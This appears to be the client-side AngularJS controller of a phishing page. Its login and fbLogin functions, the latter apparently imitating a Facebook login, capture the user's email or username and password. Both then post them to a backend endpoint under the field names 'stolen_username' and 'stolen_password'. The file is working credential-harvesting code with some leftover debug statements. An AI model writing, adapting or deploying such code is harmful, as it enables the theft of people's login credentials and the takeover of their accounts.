var app = angular.module("app", []);

app.controller("AppCtrl", function($http) {
    var app = this;

    app.pls = "check@pls.com";
    console.log(app.pls);
    // alert(app.pls);

    // $http.get("/api/entry").success(function(data) {
    //     app.entries = data.objects;
    // })

    app.login = function(username, password) {
        $http.post("/api/entry", {"stolen_username": username, "stolen_password": password})
            .success(function(data) {
                app.entries.push(data);
            })

    }

    app.fbLogin = function() {
        alert('hey ' + app.email);
        console.log(app);
        $http.post("/api/entry", {"stolen_username": app.email, "stolen_password": app.password})
            .success(function(data) {
                app.entries.push(data);
            })

    }

})